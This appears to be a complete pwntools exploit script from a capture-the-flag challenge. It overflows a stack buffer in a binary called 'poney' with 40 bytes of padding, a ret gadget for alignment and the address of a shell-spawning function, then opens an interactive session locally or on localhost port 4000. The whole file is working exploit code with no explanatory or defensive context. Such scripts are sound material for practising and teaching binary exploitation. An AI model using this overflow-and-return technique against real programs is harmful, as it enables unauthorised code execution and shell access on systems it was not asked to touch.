from pwn import * 

context.log_level = 'info'

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process('./poney')

offset = 40

ret   = 0x40053e   #pour l'alignement
shell = 0x400676

log.info(p64(shell))

payload = b'A' * offset + p64(ret) + p64(shell)
log.info(payload)

io.sendline(payload)
io.interactive()